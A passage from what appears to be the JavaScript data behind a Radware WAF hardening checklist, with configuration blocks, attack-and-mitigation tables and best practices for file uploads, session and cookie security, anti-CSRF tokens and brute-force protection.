                            <td class="p-3 border">Binary executable content embedded in files</td>
                            <td class="p-3 border">Binary signature detection, executable headers, shell code patterns</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">XSS Payloads</td>
                            <td class="p-3 border">Cross-site scripting code in SVG or other parseable formats</td>
                            <td class="p-3 border">XSS pattern detection, event handler identification</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Exploits</td>
                            <td class="p-3 border">Content designed to exploit parser or interpreter vulnerabilities</td>
                            <td class="p-3 border">Vulnerability signature matching, structure analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Hidden Malware</td>
                            <td class="p-3 border">Malware concealed through obfuscation techniques</td>
                            <td class="p-3 border">Deobfuscation, entropy analysis, sandboxing</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Sanitization Techniques</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Metadata Removal:</strong> Strip potentially dangerous metadata from files</li>
                    <li class="mb-2"><strong>Active Content Neutralization:</strong> Remove or disable scripts, macros, and other active content</li>
                    <li class="mb-2"><strong>Document Reconstruction:</strong> Rebuild documents from safe components rather than filtering</li>
                    <li class="mb-2"><strong>Image Reencoding:</strong> Decompress and reencode images to eliminate hidden content</li>
                    <li class="mb-2"><strong>Content Transformation:</strong> Convert risky formats to safer alternatives (e.g., DOCX to PDF)</li>
                    <li class="mb-2"><strong>Deep Content Inspection:</strong> Parse and validate all embedded objects and content streams</li>
                    <li class="mb-2"><strong>Structure Normalization:</strong> Enforce proper structure according to file format specifications</li>
                </ul>
            `
        },
        {
            title: 'Upload Control Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF with protective controls for file upload functionality.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure upload controls</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">file-protection</span></div>
                    <div><span class="code-command">upload-controls</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure size limits</div>
                    <div><span class="code-command">size-limits</span></div>
                    <div><span class="code-param">max-file-size</span> <span class="code-value">10MB</span></div>
                    <div><span class="code-param">max-total-upload-size</span> <span class="code-value">50MB</span></div>
                    <div><span class="code-param">enforce-content-length</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure rate limiting</div>
                    <div><span class="code-command">rate-limiting</span></div>
                    <div><span class="code-param">max-files-per-minute</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">max-uploads-per-session</span> <span class="code-value">20</span></div>
                    <div><span class="code-param">max-files-per-request</span> <span class="code-value">5</span></div>
                    <div class="code-comment"># Configure filename security</div>
                    <div><span class="code-command">filename-security</span></div>
                    <div><span class="code-param">validate-filename</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-filename-length</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">allowed-chars</span> <span class="code-value">"a-zA-Z0-9_.-"</span></div>
                    <div><span class="code-param">normalize-filename</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sanitize-filename</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure path traversal protection</div>
                    <div><span class="code-command">path-traversal</span></div>
                    <div><span class="code-param">block-traversal-attempts</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">block-absolute-paths</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">normalize-paths</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-upload-directories</span> <span class="code-value">"/uploads,/temp,/images"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Upload Attack Vectors</h5>
                <p class="mb-4 text-gray-700">Common attack vectors targeting file upload functionality:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Vector</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Mitigation</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Path Traversal</td>
                            <td class="p-3 border">Using relative paths (../../) to write files to unauthorized locations</td>
                            <td class="p-3 border">Path normalization, directory whitelisting, reject traversal sequences</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Null Byte Injection</td>
                            <td class="p-3 border">Using null characters to bypass extension validation</td>
                            <td class="p-3 border">Remove null bytes, proper string handling, filename sanitization</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Type Smuggling</td>
                            <td class="p-3 border">Disguising dangerous files as safe formats (e.g., .php.jpg)</td>
                            <td class="p-3 border">Content verification, double extension prevention, strict naming</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Resource Exhaustion</td>
                            <td class="p-3 border">Uploading massive files or many simultaneous files to exhaust resources</td>
                            <td class="p-3 border">Size limits, rate limiting, total upload size limits</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">File Overwrite</td>
                            <td class="p-3 border">Overwriting sensitive system files or other users' data</td>
                            <td class="p-3 border">Filename randomization, strong permissions, prevent overwrite</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Metadata Exploitation</td>
                            <td class="p-3 border">Exploiting metadata parsers or viewers with malicious metadata</td>
                            <td class="p-3 border">Metadata stripping, secure parsing, metadata validation</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Upload Control Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Isolated Storage:</strong> Store uploaded files outside the web root whenever possible</li>
                    <li class="mb-2"><strong>Access Control:</strong> Enforce strong authentication before allowing uploads</li>
                    <li class="mb-2"><strong>Filename Randomization:</strong> Generate random filenames to prevent overwrite attacks</li>
                    <li class="mb-2"><strong>Upload Monitoring:</strong> Monitor and alert on suspicious upload patterns</li>
                    <li class="mb-2"><strong>Progressive Restriction:</strong> Apply stricter controls for higher-risk file types</li>
                    <li class="mb-2"><strong>Quarantine Process:</strong> Implement a quarantine for suspicious files pending review</li>
                    <li class="mb-2"><strong>Defense in Depth:</strong> Apply multiple layers of protection for upload functionality</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'File Type Analyzer',
            icon: 'fa-file-alt',
            description: 'Tool for analyzing and validating file types based on content signatures.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'File Analysis Tools'
        },
        {
            title: 'Content Sanitization Engine',
            icon: 'fa-broom',
            description: 'Advanced engine for sanitizing and neutralizing malicious content in files.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Content Sanitization'
        },
        {
            title: 'Malware Scanner Integration',
            icon: 'fa-virus-slash',
            description: 'Integration with antivirus engines for detecting malware in uploaded files.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Malware Protection'
        },
        {
            title: 'File Upload Monitor',
            icon: 'fa-chart-line',
            description: 'Monitor file upload patterns and detect anomalous behavior.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Upload Monitoring'
        },
        {
            title: 'Document Analysis Tool',
            icon: 'fa-file-word',
            description: 'Specialized tool for analyzing document files for embedded threats.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Document Security'
        },
        {
            title: 'Image Validator',
            icon: 'fa-image',
            description: 'Tool for validating and securing image file uploads.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Image Security'
        }
    ]
},


{
    id: 'session-management-security',
    title: '17. Session Management Security',
    subtitle: 'Advanced session protection, cookie security, and token management for Radware WAF',
    icon: 'fa-id-badge',
    priority: 'high',
    progress: 0,
    checklist: [
        {
            title: '17.1 Cookie Security',
            icon: 'fa-cookie',
            items: [
                { id: '17.1.1', text: 'Configure cookie encryption and signing', priority: 'critical' },
                { id: '17.1.2', text: 'Set up secure flag enforcement', priority: 'critical' },
                { id: '17.1.3', text: 'Implement HttpOnly flag enforcement', priority: 'critical' },
                { id: '17.1.4', text: 'Configure SameSite attribute enforcement', priority: 'high' },
                { id: '17.1.5', text: 'Set up cookie prefixes enforcement', priority: 'medium' },
                { id: '17.1.6', text: 'Implement cookie attribute validation', priority: 'high' },
                { id: '17.1.7', text: 'Configure cookie scope management', priority: 'medium' },
                { id: '17.1.8', text: 'Set up cookie size restriction', priority: 'medium' }
            ]
        },
        {
            title: '17.2 Session Protection',
            icon: 'fa-shield-alt',
            items: [
                { id: '17.2.1', text: 'Configure session fixation protection', priority: 'critical' },
                { id: '17.2.2', text: 'Set up session timeout enforcement', priority: 'high' },
                { id: '17.2.3', text: 'Implement session concurrency controls', priority: 'high' },
                { id: '17.2.4', text: 'Configure session validity verification', priority: 'high' },
                { id: '17.2.5', text: 'Set up session binding to client attributes', priority: 'high' },
                { id: '17.2.6', text: 'Implement abnormal session detection', priority: 'high' },
                { id: '17.2.7', text: 'Configure absolute session lifetime limits', priority: 'medium' },
                { id: '17.2.8', text: 'Set up idle session termination', priority: 'medium' }
            ]
        },
        {
            title: '17.3 Token Security',
            icon: 'fa-key',
            items: [
                { id: '17.3.1', text: 'Configure anti-CSRF token protection', priority: 'critical' },
                { id: '17.3.2', text: 'Set up token entropy verification', priority: 'high' },
                { id: '17.3.3', text: 'Implement token binding to sessions', priority: 'high' },
                { id: '17.3.4', text: 'Configure token leakage prevention', priority: 'high' },
                { id: '17.3.5', text: 'Set up token reuse prevention', priority: 'high' },
                { id: '17.3.6', text: 'Implement token expiration enforcement', priority: 'medium' },
                { id: '17.3.7', text: 'Configure token format validation', priority: 'medium' },
                { id: '17.3.8', text: 'Set up multi-step form token protection', priority: 'medium' }
            ]
        },
        {
            title: '17.4 Session Attack Prevention',
            icon: 'fa-user-shield',
            items: [
                { id: '17.4.1', text: 'Configure session hijacking detection', priority: 'critical' },
                { id: '17.4.2', text: 'Set up session replay protection', priority: 'high' },
                { id: '17.4.3', text: 'Implement session poisoning prevention', priority: 'high' },
                { id: '17.4.4', text: 'Configure cross-site request detection', priority: 'high' },
                { id: '17.4.5', text: 'Set up session prediction prevention', priority: 'high' },
                { id: '17.4.6', text: 'Implement session-based rate limiting', priority: 'medium' },
                { id: '17.4.7', text: 'Configure session anomaly detection', priority: 'high' },
                { id: '17.4.8', text: 'Set up forced session termination capabilities', priority: 'medium' }
            ]
        }
    ],
    techniques: [
        {
            title: 'Cookie Security Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to enforce secure cookie attributes and protect against cookie-based attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure cookie security</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">session-security</span></div>
                    <div><span class="code-command">cookie-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure secure attributes</div>
                    <div><span class="code-command">attributes</span></div>
                    <div><span class="code-param">enforce-secure-flag</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">enforce-httponly-flag</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">enforce-samesite</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">samesite-value</span> <span class="code-value">"Lax"</span></div>
                    <div><span class="code-param">enforce-prefixes</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure cookie encryption</div>
                    <div><span class="code-command">encryption</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">cookies-to-encrypt</span> <span class="code-value">"JSESSIONID,PHPSESSID,ASPSESSIONID,session_id"</span></div>
                    <div><span class="code-param">encryption-method</span> <span class="code-value">aes-256-gcm</span></div>
                    <div><span class="code-param">key-rotation-interval</span> <span class="code-value">86400</span></div>
                    <div class="code-comment"># Configure cookie validation</div>
                    <div><span class="code-command">validation</span></div>
                    <div><span class="code-param">validate-format</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">max-cookie-size</span> <span class="code-value">4096</span></div>
                    <div><span class="code-param">max-cookies-per-domain</span> <span class="code-value">50</span></div>
                    <div><span class="code-param">allowed-characters</span> <span class="code-value">"a-zA-Z0-9_-=./"</span></div>
                    <div class="code-comment"># Cookie scope protection</div>
                    <div><span class="code-command">scope</span></div>
                    <div><span class="code-param">enforce-path-attribute</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">enforce-domain-attribute</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">prevent-third-party-cookies</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Cookie Security Attributes</h5>
                <p class="mb-4 text-gray-700">Explanation of key cookie security attributes and their importance:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attribute</th>
                            <th class="p-3 border bg-gray-100">Purpose</th>
                            <th class="p-3 border bg-gray-100">Security Impact</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Secure Flag</td>
                            <td class="p-3 border">Ensures cookie is only sent over HTTPS connections</td>
                            <td class="p-3 border">Prevents cookie theft via network sniffing on unencrypted connections</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">HttpOnly Flag</td>
                            <td class="p-3 border">Prevents JavaScript access to the cookie</td>
                            <td class="p-3 border">Mitigates impact of Cross-Site Scripting (XSS) attacks</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">SameSite Attribute</td>
                            <td class="p-3 border">Controls when cookies are sent in cross-site requests</td>
                            <td class="p-3 border">Protects against CSRF attacks and cross-site information leakage</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cookie Prefixes</td>
                            <td class="p-3 border">Enforces security attributes via prefixes (__Secure-, __Host-)</td>
                            <td class="p-3 border">Prevents downgrade attacks and provides additional security guarantees</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Path Attribute</td>
                            <td class="p-3 border">Limits cookie to specific URL paths</td>
                            <td class="p-3 border">Reduces cookie exposure to unrelated application parts</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Domain Attribute</td>
                            <td class="p-3 border">Limits cookie to specific domains/subdomains</td>
                            <td class="p-3 border">Prevents cookie sharing across unrelated subdomains</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Expires/Max-Age</td>
                            <td class="p-3 border">Sets cookie lifetime</td>
                            <td class="p-3 border">Reduces window of opportunity for cookie theft and misuse</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Cookie Protection Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Encrypt Sensitive Cookies:</strong> Encrypt session identifiers and other sensitive cookies</li>
                    <li class="mb-2"><strong>Use Cookie Signing:</strong> Implement cookie signing to detect tampering attempts</li>
                    <li class="mb-2"><strong>Enforce Security Flags:</strong> Always enforce Secure and HttpOnly flags</li>
                    <li class="mb-2"><strong>SameSite Configuration:</strong> Set appropriate SameSite values (Strict for sensitive actions)</li>
                    <li class="mb-2"><strong>Minimize Cookie Content:</strong> Store minimal information in cookies</li>
                    <li class="mb-2"><strong>Cookie Scope Restriction:</strong> Use strict path and domain restrictions</li>
                    <li class="mb-2"><strong>Cookie Prefixes:</strong> Use __Secure- or __Host- prefixes for additional protection</li>
                    <li class="mb-2"><strong>Validate Cookie Values:</strong> Ensure cookie values match expected formats and character sets</li>
                </ul>
            `
        },
        {
            title: 'Session Protection Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to implement robust session management security controls.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure session protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">session-security</span></div>
                    <div><span class="code-command">session-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure session fixation protection</div>
                    <div><span class="code-command">fixation</span></div>
                    <div><span class="code-param">enforce-regeneration</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">regeneration-triggers</span> <span class="code-value">"authentication,privilege-change,secure-area-access"</span></div>
                    <div><span class="code-param">prevent-session-adoption</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure session timeout</div>
                    <div><span class="code-command">timeout</span></div>
                    <div><span class="code-param">enforce-timeout</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">idle-timeout</span> <span class="code-value">1800</span></div>
                    <div><span class="code-param">absolute-timeout</span> <span class="code-value">28800</span></div>
                    <div><span class="code-param">privileged-timeout</span> <span class="code-value">900</span></div>
                    <div class="code-comment"># Configure session binding</div>
                    <div><span class="code-command">binding</span></div>
                    <div><span class="code-param">ip-binding</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">ip-binding-mode</span> <span class="code-value">partial</span></div>
                    <div><span class="code-param">fingerprint-binding</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">binding-attributes</span> <span class="code-value">"user-agent,accept-language,accept-encoding"</span></div>
                    <div class="code-comment"># Configure concurrency controls</div>
                    <div><span class="code-command">concurrency</span></div>
                    <div><span class="code-param">max-concurrent-sessions</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">concurrent-session-action</span> <span class="code-value">"terminate-oldest"</span></div>
                    <div><span class="code-param">notify-user</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Session Attack Types</h5>
                <p class="mb-4 text-gray-700">Common session-related attack vectors and their mitigations:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Primary Defense</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Session Fixation</td>
                            <td class="p-3 border">Attacker establishes a session and tricks the victim into using it</td>
                            <td class="p-3 border">Session regeneration after authentication, validation of session origin</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Session Hijacking</td>
                            <td class="p-3 border">Theft of session identifiers to impersonate legitimate users</td>
                            <td class="p-3 border">Secure cookies, encryption, IP/fingerprint binding, HTTPS</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Session Replay</td>
                            <td class="p-3 border">Using captured session data to replay user actions</td>
                            <td class="p-3 border">Token freshness checks, unique request identifiers, timestamps</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Session Prediction</td>
                            <td class="p-3 border">Guessing valid session identifiers based on patterns</td>
                            <td class="p-3 border">High-entropy session IDs, cryptographically secure generation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Session Poisoning</td>
                            <td class="p-3 border">Injecting malicious data into session storage</td>
                            <td class="p-3 border">Input validation, session data verification, signed session data</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Cross-Site Request Forgery</td>
                            <td class="p-3 border">Tricking users into performing actions on a site they're authenticated to</td>
                            <td class="p-3 border">Anti-CSRF tokens, SameSite cookies, referrer validation</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Session Security Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Strong Session Identifiers:</strong> Use high-entropy, unpredictable session IDs</li>
                    <li class="mb-2"><strong>Session Regeneration:</strong> Create new session IDs after authentication or privilege changes</li>
                    <li class="mb-2"><strong>Appropriate Timeouts:</strong> Set reasonable idle and absolute timeouts</li>
                    <li class="mb-2"><strong>Session Binding:</strong> Bind sessions to client attributes like IP or fingerprints</li>
                    <li class="mb-2"><strong>Secure Session Storage:</strong> Use secure server-side session storage</li>
                    <li class="mb-2"><strong>Concurrency Control:</strong> Limit simultaneous sessions per user</li>
                    <li class="mb-2"><strong>Privilege-Based Timeouts:</strong> Set stricter timeouts for privileged operations</li>
                    <li class="mb-2"><strong>Explicit Termination:</strong> Provide and enforce proper logout functionality</li>
                </ul>
            `
        },
        {
            title: 'Anti-CSRF Token Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to implement and enforce Cross-Site Request Forgery (CSRF) token protection.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure anti-CSRF token protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">session-security</span></div>
                    <div><span class="code-command">csrf-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure token validation</div>
                    <div><span class="code-command">validation</span></div>
                    <div><span class="code-param">token-parameter-name</span> <span class="code-value">"csrf_token,_token,authenticity_token"</span></div>
                    <div><span class="code-param">token-header-name</span> <span class="code-value">"X-CSRF-Token,X-XSRF-Token"</span></div>
                    <div><span class="code-param">validate-method</span> <span class="code-value">"POST,PUT,DELETE,PATCH"</span></div>
                    <div><span class="code-param">enforcement-mode</span> <span class="code-value">block</span></div>
                    <div><span class="code-param">verify-token</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure token requirements</div>
                    <div><span class="code-command">requirements</span></div>
                    <div><span class="code-param">token-length</span> <span class="code-value">32</span></div>
                    <div><span class="code-param">token-entropy</span> <span class="code-value">high</span></div>
                    <div><span class="code-param">token-expiration</span> <span class="code-value">1800</span></div>
                    <div class="code-comment"># Configure protected URLs</div>
                    <div><span class="code-command">protected-urls</span></div>
                    <div><span class="code-param">enforce-for-all-forms</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">additional-paths</span> <span class="code-value">"/admin/*,/user/*/edit,/settings/*"</span></div>
                    <div><span class="code-param">exclude-paths</span> <span class="code-value">"/api/*,/public/*"</span></div>
                    <div class="code-comment"># Configure token binding</div>
                    <div><span class="code-command">binding</span></div>
                    <div><span class="code-param">bind-to-session</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">bind-to-user</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">bind-to-function</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSRF Attack Variants</h5>
                <p class="mb-4 text-gray-700">Different variations of CSRF attacks and their specific mitigations:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">CSRF Variant</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Specific Defenses</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Standard CSRF</td>
                            <td class="p-3 border">Basic cross-site request that leverages existing authentication</td>
                            <td class="p-3 border">Anti-CSRF tokens, SameSite cookies, verification of origin</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Login CSRF</td>
                            <td class="p-3 border">Forcing a user to log in as an attacker-controlled account</td>
                            <td class="p-3 border">Pre-authentication tokens, login form protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Multi-Step CSRF</td>
                            <td class="p-3 border">CSRF attack spanning multiple requests in a workflow</td>
                            <td class="p-3 border">Workflow-specific tokens, state validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">JSON CSRF</td>
                            <td class="p-3 border">Attacks targeting JSON-based interfaces</td>
                            <td class="p-3 border">Content-Type validation, custom headers, JSON-specific protections</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">CSRF with XSS</td>
                            <td class="p-3 border">Combined attack using XSS to bypass CSRF protections</td>
                            <td class="p-3 border">Strong XSS protection, token concealment, HTTPOnly cookies</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Same-Site CSRF</td>
                            <td class="p-3 border">CSRF from related subdomains that bypass SameSite protections</td>
                            <td class="p-3 border">Strong token validation, domain-specific protections</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">CSRF Token Implementation Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Token Uniqueness:</strong> Generate unique tokens for each user session</li>
                    <li class="mb-2"><strong>High Entropy:</strong> Use cryptographically secure random tokens</li>
                    <li class="mb-2"><strong>Token Binding:</strong> Bind tokens to specific users and functions</li>
                    <li class="mb-2"><strong>Double-Submit Cookies:</strong> Use token in both cookie and request parameter</li>
                    <li class="mb-2"><strong>Custom Headers:</strong> Use custom headers for AJAX requests</li>
                    <li class="mb-2"><strong>Token Rotation:</strong> Regenerate tokens after sensitive actions</li>
                    <li class="mb-2"><strong>Expiration:</strong> Implement token expiration for long-lived sessions</li>
                    <li class="mb-2"><strong>Token Verification:</strong> Verify tokens on the server side with constant-time comparison</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'Cookie Security Analyzer',
            icon: 'fa-cookie',
            description: 'Tool for analyzing and securing cookie configurations in web applications.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Cookie Security'
        },
        {
            title: 'Session Management Monitor',
            icon: 'fa-id-badge',
            description: 'Monitor and enforce secure session management policies.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Session Monitoring'
        },
        {
            title: 'Anti-CSRF Token Validator',
            icon: 'fa-shield-alt',
            description: 'Validation and enforcement tool for CSRF token implementation.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'CSRF Protection'
        },
        {
            title: 'Session Hijacking Detector',
            icon: 'fa-user-secret',
            description: 'Advanced detection of session hijacking attempts and suspicious behavior.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Hijacking Detection'
        },
        {
            title: 'Session Fingerprinting Tool',
            icon: 'fa-fingerprint',
            description: 'Client fingerprinting tool for enhanced session binding and protection.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Session Binding'
        },
        {
            title: 'Form Protection Suite',
            icon: 'fa-file-alt',
            description: 'Comprehensive protection for web forms against CSRF and other attacks.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Form Security'
        }
    ]
},


{
    id: 'brute-force-directory-protection',
    title: '18. Brute Force & Directory Protection',
    subtitle: 'Comprehensive protection against brute force attacks, directory traversal, and unauthorized browsing',
    icon: 'fa-lock',
    priority: 'critical',
    progress: 0,
    checklist: [
        {
            title: '18.1 Authentication Protection',
            icon: 'fa-user-shield',
            items: [
                { id: '18.1.1', text: 'Configure login endpoint identification and protection', priority: 'critical' },
                { id: '18.1.2', text: 'Set up credential stuffing detection', priority: 'high' },
                { id: '18.1.3', text: 'Implement authentication rate limiting', priority: 'critical' },
                { id: '18.1.4', text: 'Configure progressive lockout mechanisms', priority: 'high' },
                { id: '18.1.5', text: 'Set up cross-endpoint attempt correlation', priority: 'high' },
                { id: '18.1.6', text: 'Implement authentication anomaly detection', priority: 'high' },
                { id: '18.1.7', text: 'Configure client fingerprinting for auth attempts', priority: 'medium' },
                { id: '18.1.8', text: 'Set up brute force pattern detection', priority: 'high' },
                { id: '18.1.9', text: 'Implement dictionary attack prevention', priority: 'high' },
                { id: '18.1.10', text: 'Configure automated CAPTCHA challenges', priority: 'medium' },
                { id: '18.1.11', text: 'Set up multi-factor auth enforcement integration', priority: 'medium' },
                { id: '18.1.12', text: 'Implement authentication flow tracking', priority: 'medium' }
            ]
        },
        {
            title: '18.2 API Brute Force Protection',
            icon: 'fa-plug',
            items: [
                { id: '18.2.1', text: 'Configure API endpoint rate limiting', priority: 'critical' },
                { id: '18.2.2', text: 'Set up API key abuse detection', priority: 'high' },
                { id: '18.2.3', text: 'Implement token brute force protection', priority: 'high' },
                { id: '18.2.4', text: 'Configure API endpoint lockout mechanisms', priority: 'high' },
                { id: '18.2.5', text: 'Set up API session throttling', priority: 'medium' },
                { id: '18.2.6', text: 'Implement API abuse pattern detection', priority: 'high' },
                { id: '18.2.7', text: 'Configure API authentication correlation', priority: 'medium' },
                { id: '18.2.8', text: 'Set up API client reputation tracking', priority: 'medium' },
                { id: '18.2.9', text: 'Implement token/key entropy analysis', priority: 'medium' },
                { id: '18.2.10', text: 'Configure API endpoint sensitivity classification', priority: 'medium' }
            ]
        },
        {
            title: '18.3 Directory Traversal Prevention',
            icon: 'fa-folder-open',
            items: [
                { id: '18.3.1', text: 'Configure path traversal detection patterns', priority: 'critical' },
                { id: '18.3.2', text: 'Set up normalized path analysis', priority: 'high' },
                { id: '18.3.3', text: 'Implement directory access control enforcement', priority: 'critical' },
                { id: '18.3.4', text: 'Configure path parameter sanitization', priority: 'high' },
                { id: '18.3.5', text: 'Set up directory whitelisting', priority: 'high' },
                { id: '18.3.6', text: 'Implement encoded traversal attack detection', priority: 'high' },
                { id: '18.3.7', text: 'Configure null byte injection protection', priority: 'high' },
                { id: '18.3.8', text: 'Set up file access pattern detection', priority: 'medium' },
                { id: '18.3.9', text: 'Implement path length restrictions', priority: 'medium' },
                { id: '18.3.10', text: 'Configure custom traversal detection signatures', priority: 'medium' },
                { id: '18.3.11', text: 'Set up directory depth limitations', priority: 'medium' },
                { id: '18.3.12', text: 'Implement relative path analysis', priority: 'high' }
            ]
        },
        {
            title: '18.4 Directory Listing Prevention',
            icon: 'fa-list',
            items: [
                { id: '18.4.1', text: 'Configure directory listing detection', priority: 'high' },
                { id: '18.4.2', text: 'Set up index page enforcement', priority: 'medium' },
                { id: '18.4.3', text: 'Implement server banner removal/masking', priority: 'medium' },
                { id: '18.4.4', text: 'Configure sensitive directory protection', priority: 'high' },
                { id: '18.4.5', text: 'Set up custom 403/404 error pages', priority: 'medium' },
                { id: '18.4.6', text: 'Implement web scanner detection', priority: 'high' },
                { id: '18.4.7', text: 'Configure crawler behavior analysis', priority: 'medium' },
